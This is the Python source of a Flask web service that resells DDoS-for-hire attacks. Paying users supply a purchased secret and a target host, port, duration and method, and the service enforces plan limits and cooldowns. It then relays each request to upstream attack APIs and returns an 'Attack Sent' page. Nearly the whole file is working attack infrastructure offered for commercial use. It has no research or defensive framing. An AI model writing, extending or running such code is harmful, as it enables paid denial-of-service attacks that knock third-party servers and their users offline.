# skiddy funnel manager for shitty C2's
# github.com/vacflood | t.me/vacflood

import json
import flask
import threading
import requests
import time as t

app = flask.Flask(__name__)

# quite possibly the shittiest system you will ever see

global used_cons
used_cons = 0

global secrets
secrets = {

}

global cooldowns
cooldowns = [

]

global concurrents
concurrents = {

}

class API():
    def __init__(self) -> None:
        self.load()

    def load(self) -> None:
        self.config = json.load(open('config.json'))
        self.host = self.config['connection']['host']
        self.port = int(self.config['connection']['port'])

        self.html = self.config['html']['enabled']
        self.brand = self.config['html']['brand']
        self.brand_link = self.config['html']['brand-link']

        self.attacks_enabled = self.config['attacks']['enabled']
        self.global_cons = int(self.config['attacks']['global_cons'])
        self.blacklisted_hosts = self.config['attacks']['blacklisted']['hosts']
        self.blacklisted_ports = self.config['attacks']['blacklisted']['ports']
        self.methods = self.config['attacks']['methods']

        self.secrets = json.load(open('secrets.json'))['secrets']
        for secret,val in self.secrets.items():
            if secret not in secrets:
                cons = val['cons']
                time = val['time']
                cooldown = val['cooldown']
                secrets[secret] = f'{cons}:{time}:{cooldown}'

        # concurrent tracker

        for secret,val in self.secrets.items():
            if secret not in concurrents:
                concurrents[secret] = '0'

        # secret updating (removing from the json file will remove them from the dicts/tables (in theory :skull:))
        
        try:
            for secret in secrets:
                if secret not in self.secrets:
                    secrets.pop(secret)
            
            for secret in concurrents:
                if secret not in self.secrets:
                    concurrents.pop(secret)
        except RuntimeError:
            pass

        print(f'secret list: {secrets}')
        print(f'concurrent list: {concurrents}')

    @staticmethod
    def attack(host: str, port: str, time: str, method: str, cooldown: int, secret) -> None:
        global used_cons
        used_cons += 1

        global cooldowns
        global concurrents

        for api in json.load(open('config.json'))['attacks']['methods']['wow']['apis']:
            try:
                formatted = str(api).replace('{HOST}',host)\
                .replace('{PORT}',port)\
                .replace('{TIME}',time)
                print(formatted)
                print(requests.get(formatted).text)
            except:
                pass

        print(f'''
        Attack Started:
              host=    {host}
              port=    {port}
              time=    {time}
              method=  {method}

        Global Cons In Use ({used_cons}/{API().global_cons})
        ''')

        concurrents[secret] = str(int(int(concurrents[secret]) + 1))
        cooldowns.append(str(secret))

        t.sleep(int(time))

        used_cons -= 1

        print(f'''
        Attack Ended:
              host=    {host}
              port=    {port}
              time=    {time}
              method=  {method}

        Global Cons In Use ({used_cons}/{API().global_cons})
        ''')
  
        t.sleep(int(cooldown))

        concurrents[secret] = str(int(int(concurrents[secret]) - 1))
        cooldowns.remove(str(secret))

@app.route('/api/attack')
def attack():
    global used_cons
    global cooldowns

    bl_host = False
    bl_port = False

    secret = flask.request.args.get('secret')
    host = flask.request.args.get('host')
    port = flask.request.args.get('port')
    time = flask.request.args.get('time')
    method = flask.request.args.get('method')

    if used_cons != API().global_cons:
        if secret not in secrets or secret == None:
            return flask.jsonify({
                'status':f'invalid secret, purchase at {API().brand_link}',
            })
        else:
            cons = int(str(secrets[secret]).split(':')[0])
            used = int(concurrents[secret])
            timee = str(secrets[secret]).split(':')[1]
            cooldown = str(secrets[secret]).split(':')[2]
        if used == cons:
            return flask.jsonify({
                'status':f'you are using {str(used)}/{str(cons)} of your concurrents.',
            })  
        if int(time) > int(timee):
            return flask.jsonify({
                'status':f'your plans maximum time is {timee}s',
            })  
        if str(secret) in cooldowns:
            return flask.jsonify({
                'status':f'you are currently under a {cooldown}s cooldown',
            })  
        if str(API().attacks_enabled).upper() == 'FALSE':
            return flask.jsonify({
                'status':f'attacks are currently disabled',
            })  
        for hostt in API().blacklisted_hosts:
            if host.find(hostt) != -1:
                bl_host = True
        for portt in API().blacklisted_ports:
            if port.find(portt) != -1:
                bl_port = True  
        if bl_host == True:
            return flask.jsonify({
                'status':f'host is blacklisted',
             })   
        if bl_port == True:
            return flask.jsonify({
                'status':f'port is blacklisted',
             })
        if str(API().methods[method]['type']).upper() == 'L4':
            try:
                for i in requests.get(f'https://ipapi.co/{host}/json').json():
                    if i == 'error':
                        return flask.jsonify({
                            'status':f'invalid ip address',
                        })  
            except requests.JSONDecodeError:
                return flask.jsonify({
                    'status':f'invalid ip address',
                })  
        if method in API().methods:
            if str(API().methods[method]['enabled']).upper() != 'FALSE':
                if str(API().methods[method]['type']).upper() == 'L4':
                    threading.Thread(target=API().attack,args=(host,port,time,method,cooldown,str(secret),)).start()
                    if str(API().html).upper() == 'FALSE':
                        return flask.jsonify({
                            'status':'attack sent',
                            'host':host,
                            'port':port,
                            'time':time,
                            'method':method,
                            'global_cons':f'{used_cons}/{API().global_cons}',
                            'info':requests.get(f'https://ipapi.co/{host}/json').json()
                        })
                    else:
                        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Sent</title>
    <style>
        body,html {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            background-color: rgb(19,19,19);
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: sans-serif;
            text-align: center;
        }

        .sent {
            padding: 10px;
            width: 400px;
            height: 300px;
            border-style: solid;
            border-color: rgb(30,30,30);
            border-radius: 10px;
            display: flex;
            justify-content: center;
            flex-direction: column;
        }
    </style>
</head>
<body>
    <div class="sent">
        <h1>🚀Attack Sent!</h1>
        <p>Host: '''+host+'''</p>
        <p>Port: '''+port+'''</p>
        <p>Time: '''+time+'''</p>
        <p>Method: '''+method+'''</p>
    </div>
</body>
</html>
                        '''
                else:
                    threading.Thread(target=API().attack,args=(host,port,time,method,cooldown,str(secret),)).start()
                    if str(API().html).upper() == 'FALSE':
                        return flask.jsonify({
                            'status':'attack sent',
                            'host':host,
                            'port':port,
                            'time':time,
                            'method':method,
                            'global_cons':f'{used_cons}/{API().global_cons}',
                            'info':requests.get(f'https://ipapi.co/{host}/json').json()
                        })
                    else:
                        return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Sent</title>
    <style>
        body,html {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            background-color: rgb(19,19,19);
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: sans-serif;
            text-align: center;
        }

        .sent {
            padding: 10px;
            width: 400px;
            height: 300px;
            border-style: solid;
            border-color: rgb(30,30,30);
            border-radius: 10px;
            display: flex;
            justify-content: center;
            flex-direction: column;
        }
    </style>
</head>
<body>
    <div class="sent">
        <h1>🚀Attack Sent!</h1>
        <p>Host: '''+host+'''</p>
        <p>Port: '''+port+'''</p>
        <p>Time: '''+time+'''</p>
        <p>Method: '''+method+'''</p>
    </div>
</body>
</html>
                        '''
            else:
                return flask.jsonify({
                    'status':f'method is currently disabled',
                })  
        else:
            return flask.jsonify({
                'status':f'method does not exist',
            })   
    else:
        return flask.jsonify({
            'status':f'global cons is {API().global_cons}/{used_cons}',
        })

app.run(API().host, API().port)
